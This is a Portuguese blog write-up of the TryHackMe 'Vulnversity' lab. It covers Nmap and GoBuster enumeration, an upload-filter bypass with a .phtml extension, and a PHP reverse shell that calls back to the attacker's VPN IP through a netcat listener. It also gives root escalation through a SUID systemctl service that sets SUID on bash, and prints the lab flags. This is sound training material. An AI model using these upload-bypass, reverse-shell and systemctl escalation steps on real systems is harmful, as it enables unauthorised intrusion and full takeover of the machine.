---
title: Vulnversity - Desafio Hacker [TryHackMe]
description: 'Resolvendo máquina da TryHackMe através de enumeração com Nmap, fuzzing de diretórios, bypass de upload e privilege escalation via SUID'
author: matheus
tags: ["tryhackme", "WriteUps", "nmap", "gobuster", "reverse shell", "SUID", "privilege escalation"]
categories: ["SecLab", "WayOfSec", "Hacking", "Write Ups"]
pin: false
comments: true
last_modified_at: 2025-12-19

---

# Vulnversity - Writeup

### Enumeração com Nmap, Directory Bruteforce, Upload Bypass e Privilege Escalation via SUID

Essa é uma máquina de nível fácil do TryHackMe, perfeita para quem está começando no mundo do hacking. A ideia aqui é passar por todo o fluxo básico de um pentest: desde a enumeração inicial com Nmap, passando por fuzzing de diretórios, exploração de upload vulnerável até chegar na escalação de privilégios via SUID. Se você está dando os primeiros passos em CTFs ou quer reforçar os fundamentos, essa máquina é um excelente ponto de partida.

**Link da sala:** [tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

> *Será pulado desse writeup as tasks sobre estar conectado à VPN, ter um sistema com Nmap instalado, estar conectado na máquina do desafio e também pularemos as perguntas que não precisam de resposta.*

---

## 1. Enumeração com Nmap

### 1.1 O que é Nmap?

O **Nmap** (Network Mapper) é, sem dúvida, uma das ferramentas mais essenciais para qualquer profissional de segurança. Com ele conseguimos descobrir hosts ativos na rede, portas abertas, serviços rodando e até mesmo o sistema operacional do alvo. Basicamente, é seu primeiro passo em qualquer pentest - antes de atacar qualquer coisa, você precisa saber o que está na sua frente.

### 1.2 Scan inicial

Assim que a máquina foi iniciada e recebi o IP alvo, já parti para o Nmap. Começamos com um scan básico para identificar os serviços rodando:

```bash
nmap -sV 10.10.84.129
```

Para um scan mais completo, podemos adicionar o `-Pn`:

```bash
nmap -sV -Pn 10.10.84.129
```

O parâmetro `-Pn` desabilita a descoberta de host (ping), o que é útil quando firewalls bloqueiam ICMP. Em alguns casos, sem esse parâmetro o Nmap pode achar que o host está offline quando na verdade está apenas filtrando pings.

### 1.3 Flags importantes do Nmap

Antes de continuar, vale a pena entender as principais flags que podemos usar. Inclusive, podemos utilizar o `nmap --help` para consultar isso a qualquer momento - é bom ter esse hábito de consultar o help das ferramentas:

| Flag Nmap      | Descrição                                                                              |
| -------------- | -------------------------------------------------------------------------------------- |
| `-sV`          | Tenta determinar a versão dos serviços rodando                                         |
| `-p<x> ou -p-` | Scan de portas específicas `<x>` ou de todas as portas                                 |
| `-Pn`          | Desabilita descoberta de host e apenas escaneia portas abertas                         |
| `-A`           | Habilita detecção de OS e versão, executa scripts built-in para enumeração adicional   |
| `-sC`          | Escaneia com os scripts padrões do Nmap                                                |
| `-v`           | Modo verbose (mostra mais detalhes)                                                    |
| `-sU`          | Scan de portas UDP                                                                     |
| `-sS`          | Scan TCP SYN (stealth scan)                                                            |

### 1.4 Scan mais agressivo (opcional)

Uma coisa importante de saber: o Nmap por padrão escaneia apenas as mil portas mais comuns. Só que existem mais de 65 mil portas possíveis, então dependendo do cenário você pode estar perdendo informações valiosas. Para fazer um scan completo, podemos indicar as portas manualmente ou simplesmente usar `-p-` para escanear todas:

```bash
nmap -sS -p1-65535 10.10.84.129
#ou
nmap -sS -p- 10.10.84.129
```

**Atenção:** Isso demora MUITO. São muitas portas e o tempo de scan aumenta consideravelmente. Podemos agilizar com `-T4` que aumenta a velocidade de envio de pacotes, mas cuidado com o `-T5` - ele é tão agressivo que pode acabar te derrubando da conexão ou sendo bloqueado por firewalls.

```bash
sudo nmap -sS -p- 10.10.84.129 -T4 -vv
```

O `-vv` aumenta o verbose para mostrar mais detalhes durante o scan, assim você consegue acompanhar o progresso em tempo real ao invés de ficar olhando para uma tela parada.

### 1.5 Resultados do scan

Para este exercício, o comando que eu utilizei foi:

```bash
sudo nmap -sV -Pn 10.10.84.129
```

Assim o resultado já deu o que precisávamos sem demorar tanto tempo. Claro que em um cenário real seria interessante fazer um scan mais completo, mas para CTFs iniciantes geralmente as portas importantes estão entre as mais comuns mesmo.

**Resultado:**

```yaml
┌──(laidler㉿kali)-[~/Documents/seclab]
└─$ nmap -sV -Pn 10.10.84.129
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

### 1.6 Respondendo as questões

Com essa saída em mãos, já conseguimos responder várias questões do desafio.

**Quantas portas estão abertas?**

Contando as portas listadas, temos **6** portas abertas detectadas.

```yaml
Resposta: 6
```

**Versão do Squid proxy?**

Na saída do comando, podemos ver claramente: `Squid http proxy 3.5.12`

```yaml
Resposta: 3.5.12
```

**Nmap escanearia quantas portas com o parâmetro `-p-400`?**

O parâmetro `-p-400` indica que queremos escanear as portas de 1 até 400. Simples assim.

```yaml
Resposta: 400
```

**Já o parâmetro `-n`, o que o Nmap não irá resolver?**

Usando a flag `-n`, o Nmap **não** resolverá os nomes de domínio DNS. Isso significa que ele não vai tentar converter endereços IP em nomes de host, o que pode **acelerar** bastante as varreduras. Se você não sabia disso, basta rodar `nmap --help` que vai encontrar essa informação - é sempre bom consultar a documentação das ferramentas.

```yaml
Resposta: DNS
```

**Qual sistema operacional provavelmente está sendo rodado?**

Olhando a saída, podemos ver várias referências a "Ubuntu" nos serviços - tanto no SSH quanto no Apache. Dá pra inferir com bastante confiança.

```yaml
Resposta: Ubuntu
```

**Qual porta está rodando o web server?**

O Apache httpd está rodando na porta **3333**, ou seja, temos um site em `http://10.10.84.129:3333`. Perceba que não é a porta padrão 80, então se você tentasse acessar o IP direto no navegador sem especificar a porta, não ia encontrar nada.

```yaml
Resposta: 3333
```

---

## 2. Enumeração de Diretórios com GoBuster

### 2.1 O que é GoBuster?

**GoBuster** é uma ferramenta usada para fazer brute force de URIs (diretórios e arquivos), subdomínios DNS e nomes de host virtual. Para esta máquina, vamos focar em descobrir diretórios ocultos no servidor web - aquelas pastas que não estão linkadas diretamente na página principal mas que existem no servidor.

Confesso que eu geralmente uso outras ferramentas como `dirb` ou `dirsearch` no dia a dia, mas o GoBuster é bem eficiente e rápido. Vale a pena ter no arsenal.

**Instalação (caso necessário):**

```bash
sudo apt-get install gobuster
```

### 2.2 Wordlists

Se você está no Kali Linux, vai encontrar várias wordlists prontas em `/usr/share/wordlists/`. Para esse tipo de fuzzing de diretórios, uma boa opção é a `directory-list-2.3-medium.txt` que fica em `/usr/share/wordlists/dirbuster/`. 

A escolha da wordlist faz diferença - uma wordlist muito pequena pode não encontrar nada, enquanto uma muito grande vai demorar demais. A medium costuma ser um bom equilíbrio.

### 2.3 Parâmetros do GoBuster

Aqui estão os parâmetros mais úteis do GoBuster:

| Flag GoBuster     | Descrição                                                 |
| ----------------- | --------------------------------------------------------- |
| `-e`              | Printa as URLs completas no console                       |
| `-u`              | A URL alvo                                                |
| `-w`              | Caminho para a wordlist                                   |
| `-U` e `-P`       | Usuário e senha para Basic Auth                           |
| `-p <x>`          | Proxy para usar nas requisições                           |
| `-c <cookies>`    | Especifica cookie para simular autenticação               |

### 2.4 Executando o fuzzing

Vamos usar o GoBuster para encontrar diretórios interessantes no servidor web que descobrimos:

```bash
gobuster dir -u http://10.10.84.129:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Resultado:**

```yaml
┌──(laidler㉿kali)-[~/Documents/seclab]
└─$ gobuster dir -u "http://10.10.84.129:3333/" -w common.txt 

===============================================================
[+] Url:                     http://10.10.84.129:3333/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
===============================================================
images               (Status 301) [Size 320] [--> http://10.10.84.129:3333/images/]
css                  (Status 301) [Size 317] [--> http://10.10.84.129:3333/css/]
fonts                (Status 301) [Size 319] [--> http://10.10.84.129:3333/fonts/]
internal             (Status 301) [Size 322] [--> http://10.10.84.129:3333/internal/]
```

### 2.5 Qual diretório é uma aba de upload?

Analisando os diretórios encontrados, a maioria parece ser recursos estáticos do site (images, css, fonts). Mas o `/internal/` chama atenção por ser um nome sugestivo. Ao acessar `http://10.10.84.129:3333/internal/`, nos deparamos com uma página de upload!

Esse tipo de descoberta é muito comum em CTFs e também em pentests reais - funcionalidades "escondidas" que não estão linkadas na página principal mas que podem ser exploradas.

```yaml
Resposta: /internal/
```

---

## 3. Comprometendo o Webserver

### 3.1 Conceito de Upload Bypass

Agora que encontramos um formulário de upload, a primeira coisa que vem à mente é: será que conseguimos fazer upload de um arquivo malicioso? Se o servidor executar código PHP, por exemplo, poderíamos fazer upload de uma webshell e ganhar acesso ao sistema.

O problema é que geralmente existem filtros que bloqueiam extensões perigosas como `.php`. E é exatamente isso que acontece aqui - se tentarmos fazer upload de um arquivo `.php`, o servidor vai bloquear.

### 3.2 Qual tipo de arquivo é bloqueado?

Testando diferentes extensões, descobrimos que arquivos `.php` são bloqueados pelo servidor. Isso é uma medida de segurança comum, mas como veremos, nem sempre é implementada corretamente.

```yaml
Resposta: .php
```

### 3.3 Fuzzing de extensões com Burp Suite

Beleza, `.php` é bloqueado. Mas existem várias outras extensões que o PHP pode interpretar, como `.php3`, `.php4`, `.php5`, `.phtml`, entre outras. A pergunta é: será que o desenvolvedor lembrou de bloquear todas elas?

Para identificar quais extensões são permitidas, vamos usar o **Burp Suite** para fazer fuzzing automatizado. A ideia é enviar várias requisições de upload, cada uma com uma extensão diferente, e ver qual passa pelo filtro.

Primeiro, crie uma wordlist com extensões PHP alternativas:

```text
.php
.php3
.php4
.php5
.phtml
```

Agora o processo no Burp Suite:

1. Configure o Burp para interceptar o tráfego do navegador
2. Faça um upload de teste e capture a requisição
3. Envie a requisição para o **Intruder**
4. Na aba "Positions", marque a extensão do arquivo com `§`:

```text
filename="shell§.php§"
```

5. Na aba "Payloads", carregue a wordlist de extensões que criamos
6. Execute o ataque e analise os resultados - procure por respostas com tamanho ou status code diferente

### 3.4 Qual extensão é permitida?

Após rodar o ataque no Burp Suite, descobrimos que a extensão `.phtml` é permitida! Isso acontece porque o desenvolvedor provavelmente só bloqueou `.php` e esqueceu das outras variantes. É um erro bem comum, na verdade.

```yaml
Resposta: .phtml
```

### 3.5 Preparando o Reverse Shell

Agora que sabemos qual extensão usar, vamos preparar nosso payload. A ideia aqui é usar um **reverse shell** - ao invés de tentarmos conectar no servidor (o que provavelmente seria bloqueado por firewall), fazemos o servidor conectar de volta para nossa máquina. É uma técnica muito útil porque bypassa firewalls que bloqueiam conexões de entrada mas permitem conexões de saída.

O Kali já vem com um reverse shell em PHP pronto para uso:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Agora precisamos editar o arquivo para configurar nosso IP e porta. Abra o arquivo com seu editor preferido (nano, vim, etc):

```bash
nano php-reverse-shell.php
```

Procure pelas linhas que definem o IP e porta (ficam logo no começo do arquivo, por volta da linha 49):

```php
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

E altere para o seu IP na VPN do TryHackMe e a porta que você vai escutar:

```php
$ip = '10.6.30.6';  // Seu IP na VPN (use o seu!)
$port = 1234;       // Porta que você vai escutar
```

Para descobrir seu IP na VPN, você pode acessar `http://10.10.10.10` no navegador da máquina conectada ao TryHackMe, ou simplesmente rodar `ip addr show tun0` no terminal.

Por fim, renomeie o arquivo para usar a extensão que descobrimos que funciona:

```bash
mv php-reverse-shell.php php-reverse-shell.phtml
```

### 3.6 Configurando o Listener

Antes de fazer o upload, precisamos deixar nossa máquina escutando conexões. Se não fizermos isso, quando o servidor tentar conectar de volta não vai ter ninguém esperando e a conexão vai falhar.

Usamos o netcat para isso:

```bash
nc -lvnp 1234
```

Os parâmetros são:

- `-l` - Modo listen (escuta)
- `-v` - Verbose, para ver o que está acontecendo
- `-n` - Não resolver DNS (mais rápido)
- `-p 1234` - Porta para escutar (tem que ser a mesma que configuramos no shell)

### 3.7 Executando o ataque

Com tudo preparado, agora é a hora da verdade:

1. Faça upload do arquivo `php-reverse-shell.phtml` através da página `/internal/`
2. Navegue até o arquivo uploaded em `http://10.10.84.129:3333/internal/uploads/php-reverse-shell.phtml`

Ao acessar essa URL, o servidor vai executar nosso código PHP e tentar conectar de volta na nossa máquina. Se tudo deu certo, você vai ver algo assim no terminal onde o netcat está rodando:

```bash
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.6.30.6] from (UNKNOWN) [10.10.84.129] 47082
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP
$ whoami
www-data
```

Conseguimos uma shell! Estamos logados como `www-data`, que é o usuário padrão do servidor web Apache.

### 3.8 Qual é o nome do usuário que gerencia o webserver?

Agora que estamos dentro do sistema, podemos explorar. Vamos ver quais usuários existem:

```bash
ls /home
```

```yaml
Resposta: bill
```

### 3.9 Qual é a user flag?

Navegando até o diretório home do usuário bill, encontramos a primeira flag:

```bash
cat /home/bill/user.txt
```

```yaml
Resposta: 8bd7992fbe8a6ad22a63361004cfcedb
```

---

## 4. Escalação de Privilégios

### 4.1 Conceito de SUID

Beleza, conseguimos acesso ao sistema, mas estamos como `www-data` - um usuário com poucos privilégios. O próximo passo é tentar escalar para root. E uma das técnicas mais clássicas para isso em sistemas Linux é explorar binários com permissão **SUID**.

Mas o que é SUID? É uma permissão especial que faz com que um arquivo seja executado com as permissões do **dono do arquivo**, e não do usuário que está executando. 

Um exemplo clássico é o binário `/usr/bin/passwd`. Quando você muda sua senha no Linux, o comando `passwd` precisa escrever no arquivo `/etc/shadow`, que só root pode modificar. Mas você não é root, então como isso funciona? O binário `passwd` tem SUID setado para root, então quando você executa ele, temporariamente ele roda com permissões de root para conseguir fazer a alteração.

**Por que isso é perigoso?**

Se encontrarmos um binário com SUID para root que não deveria ter, ou que podemos explorar de alguma forma, conseguimos executar comandos como root. É o caminho perfeito para privilege escalation.

### 4.2 Procurando arquivos com SUID

Para encontrar todos os arquivos com bit SUID setado no sistema, usamos o comando `find`:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Vamos entender cada parte:

- `/` - Busca a partir da raiz do sistema
- `-perm -u=s` - Arquivos com permissão SUID
- `-type f` - Apenas arquivos (não diretórios)
- `2>/dev/null` - Descarta mensagens de erro (tipo "permission denied" em diretórios que não temos acesso)

### 4.3 Qual arquivo se destaca?

Analisando a lista que o comando retorna, a maioria são binários comuns que geralmente têm SUID (como passwd, ping, sudo, etc). Mas um arquivo se destaca por não ser comum ter SUID:

```yaml
Resposta: /bin/systemctl
```

O **systemctl** é usado para gerenciar serviços do sistema (iniciar, parar, reiniciar serviços, etc). Normalmente ele não deveria ter SUID porque permite controle muito amplo sobre o sistema. Com SUID, podemos criar e executar nosso próprio serviço como root!

### 4.4 Explorando o systemctl

A técnica aqui é criar um serviço malicioso que será executado como root. O que vamos fazer é usar esse serviço para setar o bit SUID no `/bin/bash`, permitindo que executemos bash como root depois.

Primeiro, vale a pena melhorar nossa shell (que está bem limitada). Isso é opcional, mas facilita muito a vida:

```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

Agora vamos criar um arquivo de serviço temporário. No Linux, arquivos de serviço seguem um formato específico e ficam geralmente em `/etc/systemd/system/`:

```bash
TF=$(mktemp).service
```

Esse comando cria um arquivo temporário com extensão `.service` e guarda o caminho na variável `TF`.

Agora escrevemos a configuração do serviço malicioso nesse arquivo:

```bash
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
```

Explicando o que cada linha faz:

- `Type=oneshot` - Executa uma vez e termina
- `ExecStart=...` - Comando a ser executado: `chmod +s /bin/bash` adiciona SUID ao bash
- `WantedBy=multi-user.target` - Define quando o serviço deve ser ativado

Agora linkamos o serviço no systemd:

```bash
/bin/systemctl link $TF
```

**Resultado:**

```text
Created symlink from /etc/systemd/system/tmp.L2ZnoQIOt3.service to /tmp/tmp.L2ZnoQIOt3.service.
```

E habilitamos e executamos o serviço:

```bash
/bin/systemctl enable --now $TF
```

**Resultado:**

```text
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.L2ZnoQIOt3.service to /tmp/tmp.L2ZnoQIOt3.service.
```

Vamos verificar se funcionou checando as permissões do bash:

```bash
ls -l /bin/bash
```

**Resultado:**

```text
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
```

Perceba o `s` na permissão onde normalmente seria `x`. Isso indica que o SUID foi setado com sucesso!

Agora é só executar o bash com o parâmetro `-p`, que preserva os privilégios do dono (root) devido ao SUID:

```bash
/bin/bash -p
```

E confirmamos que agora somos root:

```bash
whoami
```

```text
root
```

### 4.5 Obtendo a root flag

Agora com acesso root, podemos finalmente ler a flag final:

```bash
cd /root
cat root.txt
```

```yaml
Resposta: a58ff8579f0a9270368d33a9966c7fd5
```

---

## 5. Resumo do Ataque

Para quem quiser ter uma visão geral do que fizemos, aqui está o fluxo completo:

1. **Enumeração de portas** com Nmap - Descobrimos 6 portas abertas, incluindo um web server na porta 3333
2. **Fuzzing de diretórios** com GoBuster - Encontramos `/internal/` com um formulário de upload
3. **Bypass de extensão** com Burp Suite - Descobrimos que `.phtml` passa pelo filtro que bloqueia `.php`
4. **Reverse shell** - Fizemos upload de um PHP reverse shell e obtivemos acesso como `www-data`
5. **Enumeração de SUID** - Encontramos `/bin/systemctl` com SUID (algo que não deveria acontecer)
6. **Privilege escalation** - Criamos um serviço malicioso para setar SUID no bash
7. **Root** - Executamos bash com privilégios elevados e capturamos a flag

---

## 6. Lições Aprendidas

Essa máquina, apesar de simples, ensina conceitos fundamentais que aparecem constantemente em CTFs e pentests reais.

### Sobre enumeração

O Nmap é realmente o primeiro passo de qualquer pentest. Sem saber o que está rodando no alvo, você está no escuro. Além disso, não confie apenas nas portas padrão - use `-p-` quando tiver tempo, pois serviços importantes podem estar em portas não convencionais (como o web server na 3333 dessa máquina).

O fuzzing de diretórios também é essencial. Muitas funcionalidades interessantes (e vulneráveis) não estão linkadas na página principal. Formulários de upload, painéis de admin, arquivos de backup - tudo isso pode estar escondido esperando ser descoberto.

### Sobre exploração de uploads

Filtros de extensão são notoriamente difíceis de implementar corretamente. Nesse caso, o desenvolvedor bloqueou `.php` mas esqueceu de `.phtml`. Existem dezenas de variantes que podem funcionar dependendo da configuração do servidor: `.php3`, `.php4`, `.php5`, `.phar`, `.inc`, etc. Sempre vale testar.

O Burp Suite é uma ferramenta indispensável para esse tipo de teste. Automatizar o fuzzing de extensões economiza muito tempo e garante que você não vai perder nenhuma variante.

### Sobre privilege escalation

A busca por arquivos SUID deveria ser um dos primeiros passos após conseguir acesso a um sistema. O comando `find / -perm -u=s -type f 2>/dev/null` vai te mostrar todos os binários com essa permissão especial.

O site **GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io/)) é uma referência obrigatória - ele lista técnicas de exploração para diversos binários Linux. Se você encontrar um SUID interessante, provavelmente já existe uma técnica documentada lá.

### Recursos úteis

- **GTFOBins:** [gtfobins.github.io](https://gtfobins.github.io/) - Database de binários exploráveis
- **PayloadsAllTheThings:** [github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Payloads para diversos cenários
- **PentestMonkey:** [pentestmonkey.net](http://pentestmonkey.net/) - Reverse shells e cheat sheets

---

E é isso! Uma máquina simples mas que ensina fundamentos muito importantes. Se você está começando, pratique bem essas técnicas porque elas aparecem em praticamente todo CTF e pentest real. A repetição vai fazer esses passos virarem automáticos.

Bons estudos e happy hacking!

<div style="background:transparent !important; text-align:center">
  <iframe
    src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=2385463"
    style="border:none; width:450px; height:120px"
  ></iframe>
</div>
